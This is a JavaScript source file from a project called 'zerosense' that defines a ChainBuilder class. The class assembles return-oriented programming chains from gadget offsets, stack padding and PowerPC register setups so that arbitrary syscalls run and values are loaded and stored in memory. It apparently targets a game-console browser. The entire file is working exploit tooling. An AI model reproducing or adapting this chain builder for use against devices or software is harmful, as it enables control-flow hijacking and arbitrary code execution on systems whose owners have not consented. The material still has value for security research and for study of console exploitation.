/*eslint-disable no-param-reassign */
var Chain = require('zerosense/Chain');
var Util = require('zerosense/Util');

class ChainBuilder {
	
	constructor(offsets, gtemp = 0x8d000000) {
		this.offsets = offsets;
	
		this.dataAddress = 0;
	
		this.dataOffsets = {};
		this.chainDataOffsets = [];
		
		this.data = "";
		this.chain = "";
		
		this.gtemp = gtemp;
		this.stackPad = 0;
		
		this.chainStart();
	}
	
	create() {
		this.chainEnd();
		
		return new Chain(this);
	}
	
	getData() {
		return this.data;
	}
	
	getChain() {
		return unescape("\u4141\u2a2f")
			+ this.chain
			+ unescape("\u2f2a");
	}
	
	
	///////////////////////////////////////
	// Public: Data
	///////////////////////////////////////
	
	getDataOffset(id) {
		return this.dataOffsets[id];
	}
	
	addData(id, str) {
		this.dataOffsets[id] = this.getDataCurrentOffset();
		this.appendData(str);
		return this;
	}
	
	addDataInt32(id, value = 0) {
		this.dataOffsets[id] = this.getDataCurrentOffset();
		this.appendData(Util.int32(value));
		return this;
	}
	
	addDataInt64(id, value = 0) {
		this.dataOffsets[id] = this.getDataCurrentOffset();
		this.appendData(Util.int64(0, value));
		return this;
	}
	
	addBuffer(id, size) {
		this.dataOffsets[id] = this.getDataCurrentOffset();
		this.appendData(Util.pad(size));
		return this;
	}
	
	
	///////////////////////////////////////
	// Public: Chain building
	///////////////////////////////////////
	
	syscall(sc, r3 = 0, r4 = 0, r5 = 0, r6 = 0, r7 = 0, r8 = 0, r9 = 0, r10 = 0, r31out) {
		var AA = unescape("\u4141"), SF = unescape("\u5346");
		
		r31out = r31out || this.gtemp;
		
		this.appendChain(
			Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.gtemp)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod1)
			+ Util.pad(0x5C, AA)
		);
		
		this.appendChainParamInt32(sc);
		this.appendChainParamInt32(r10);
		this.appendChainParamInt32(r8);
		this.appendChainParamInt32(r7);
		this.appendChainParamInt32(r6);
		this.appendChainParamInt32(r5);
		this.appendChainParamInt32(r4);
		
		this.appendChain(
			Util.pad(0x4, AA)
		);
		
		this.appendChainParamInt32(r9);
		
		this.appendChain(
			Util.pad(0x20, AA)
		);
		
		this.appendChainParamInt64(r3);
		
		this.appendChain(	
			//////////
			
			Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.gtemp)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod4a)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, r31out)
		);
		
		return this;
	}
	
	/**
	 * Needs fixing/cleanup
	 */
	loadR3(src, r26out, r27out, r28out, r29out, r30out, r31out) {
		var AA = unescape("\u4141"), SF = unescape("\u5346");
		
		r26out = r26out || this.gtemp;
		r27out = r27out || this.gtemp;
		r28out = r28out || this.gtemp;
		r29out = r29out || this.gtemp;
		r30out = r30out || this.gtemp;
		r31out = r31out || this.gtemp;
		
		var c = Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod3)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.gtemp)
			+ Util.int64(0x0, src - 0x8)
			+ Util.int64(0x0, this.gtemp)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod15)
			+ Util.pad(0x58, AA)
			+ Util.int64(0x0, r26out)
			+ Util.int64(0x0, r27out)
			+ Util.int64(0x0, r28out)
			+ Util.int64(0x0, r29out)
			+ Util.int64(0x0, r30out)
			+ Util.int64(0x0, r31out);
			
		this.appendChain(c);
		
		return this;
	}
	
	storeR3(dst) {
		var AA = unescape("\u4141"), SF = unescape("\u5346");
		
		this.appendChain(
			Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod13 + 4)
			+ Util.pad(0x60, AA)
		);

		this.appendChainParamInt64(dst, -0x10);
		
		this.appendChain(
			//////////
			
			Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod13)
			+ Util.pad(0x68, AA)
		);
		
		return this;
	}
	
	
	///////////////////////////////////////
	// Private: Data
	///////////////////////////////////////
	
	appendData(d) {
		this.data += d;
	}
	
	getDataCurrentOffset() {
		return this.data.length * 2;
	}
	
	updateDataAddress(daddr) {
		this.dataAddress = daddr;
		
		for (var i = 0; i < this.chainDataOffsets.length; i++) {
			var cdo = this.chainDataOffsets[i];
			
			this.chain = this.chain.substr(0, cdo.chainOffset)
				+ Util.int32(this.dataAddress + cdo.dataOffset)
				+ this.chain.substr(cdo.chainOffset + 0x4 / 2);
		}
	}
	
	
	///////////////////////////////////////
	// Private: Chain
	///////////////////////////////////////
	
	appendChain(c) {
		this.chain += c;
	}
	
	appendChainDataOffset(doff) {
		var DO = unescape("\u444f");
		
		this.chainDataOffsets.push({ chainOffset: this.chain.length, dataOffset: doff });
		this.appendChain(Util.pad(0x4, DO));
	}
	
	appendChainParamInt32(param, offset = 0) {
		if (typeof param === "string") {
			// Data ID
			this.appendChainDataOffset(this.dataOffsets[param] + offset);
		} else {
			// Integer
			this.appendChain(Util.int32(param + offset));
		}
	}
	
	appendChainParamInt64(param, offset = 0) {
		if (typeof param === "string") {
			// Data ID
			this.appendChain(Util.int32(0x0));
			this.appendChainDataOffset(this.dataOffsets[param] + offset);
		} else {
			// Integer
			this.appendChain(Util.int64(0x0, param + offset));
		}
	}
	
	
	///////////////////////////////////////
	// Private: Chain building
	///////////////////////////////////////
	
	chainStart() {
		var AA = unescape("\u4141"), SF = unescape("\u5346"), SX = unescape("\u5358");
		
		// Helper stack frame for exiting the chain.
		// First long is the stack pointer, gadget mod8 loads from this frame.
		// This is the second time it's called, since we have to dereference the pointer on the chain stack.
		this.dataOffsets['sfExit'] = this.getDataCurrentOffset();
		this.appendData(
			Util.int32(0x0)
			+ Util.pad(0x4, SX)
			+ Util.pad(0x8, AA)
			+ Util.int64(0x0, this.offsets.gadgetMod8)
		);
		
		// OPD for calling a gadget with no stack frame
		this.dataOffsets['opdGadgetZ1'] = this.getDataCurrentOffset();
		this.appendData(
			Util.int32(this.offsets.gadgetZ1)
			+ Util.int32(this.offsets.addrToc)
		);
		
		//////////
		
		this.appendChain(
			// Set up our new stack
			Util.int32(this.offsets.gadget1)
			+ Util.int32(this.offsets.addrToc)
			+ Util.pad(0x20, AA)
			+ Util.int64(0x0, this.offsets.addrToc)
			+ Util.pad(0x60, AA)
			
			//////////
			
			// Load r9 from stack, which is the opd to branch to
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetZMod1)
			+ Util.pad(0x68, AA)
			+ Util.int32(0x0)
		);
		
		this.appendChainDataOffset(this.dataOffsets['opdGadgetZ1']);
		
		this.appendChain(
			Util.int64(0x0, 0xffffffff)
			+ Util.pad(0x20, AA)
			
			//////////
			
			// Branch to our opd, which adds to r3 to get our exit stack pointer
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetZMod2)
			+ Util.pad(0x58, AA)
			
			//////////
			
			// Set up destination for our exit stack pointer, the data buffer
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod13 + 4)
			+ Util.pad(0x60, AA)
			+ Util.int32(0x0)
		);
		
		this.appendChainDataOffset(this.dataOffsets['sfExit'] + 0x4 - 0x10);
			
		this.appendChain(
			//////////
			
			// Save the exit stack pointer
			Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod13)
			+ Util.pad(0x68, AA)
		);
	}
	
	chainEnd() {
		var AA = unescape("\u4141");
		
		this.appendChain(
			// Load helper exit stack frame pointer from stack, and dereference once.
			// Continue from the helper frame, which finishes up.
			Util.int32(0x0)
		);
		
		this.appendChainDataOffset(this.dataOffsets['sfExit']);
		
		this.appendChain(
			Util.pad(0x8, AA)
			+ Util.int64(0x0, this.offsets.gadgetMod8)
		);
	}
	
}

module.exports = ChainBuilder;